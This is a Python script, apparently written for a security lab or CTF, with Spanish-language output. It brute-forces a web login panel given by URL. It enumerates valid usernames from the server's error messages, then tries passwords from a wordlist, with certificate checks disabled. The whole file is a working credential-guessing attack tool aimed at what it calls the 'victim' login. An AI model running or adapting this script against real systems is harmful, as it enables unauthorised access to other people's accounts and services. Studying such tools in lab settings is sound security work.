#!/usr/bin/python3 

import requests
import sys 
import urllib3
import json
import signal
import time
import pdb
import argparse
from termcolor import colored
from pwn import *

# Ctrl + C 

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# HTTPS problem

urllib3.disable_warnings()

def get_arguments():

    parser = argparse.ArgumentParser(description='Brute Force Panel Login') 
    parser.add_argument("-u", "--url",dest="url", required=True, help='Victim panel login url (Ex: -u www.example.com/login)') 
    parser.add_argument("-uf", "--usersfile", dest="usersfile", required=True, help="File containing usernames")
    parser.add_argument("-pf", "--passwordsfile", dest="passwordsfile", required=True, help="File containing passwords")


    options = parser.parse_args()

    return options.url, options.usersfile, options.passwordsfile

def brute_force(s, url, users_file, passwords_file):

    
    with open(users_file, "r") as u:
        usernames = u.read().split("\n")
    with open(passwords_file, "r") as p:
        passwords = p.read().split("\n")

#    pdb.set_trace()

    p1 = log.progress("Users Brute Force")
    p1.status("Iniciando Proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("User Brute Force")
    p2.status(f"\n[+] Probando Usuarios en el panel de login...\n")

    for username in usernames:


            post_data = {
                "username": "%s" % username, 
                "password": "test",

            }

            r = s.post(url, data=post_data)

            if "Invalid username" not in r.text:
                correct_username = username
                break

    p3 = log.progress("Password Brute Force")
    p3.status(f"\n[+] Probando passwords con el usuario '{correct_username}'...\n")

    for password in passwords:

        post_data = {
            "username": "%s" % correct_username, 
            "password": "%s" % password,

        }

        r = s.post(url, data=post_data)

        if "Incorrect password" not in r.text:
            correct_password = password
            break

    return (correct_username, correct_password)


def main():

    s = requests.session()
    s.verify = False
    url, usersfile, passwordsfile = get_arguments()
    username, password = brute_force(s, url, usersfile, passwordsfile)
    print(colored(f"\n[+] El usuario correcto es '{username}' y su password es '{password}'", "green"))


if __name__ == "__main__":

    main()
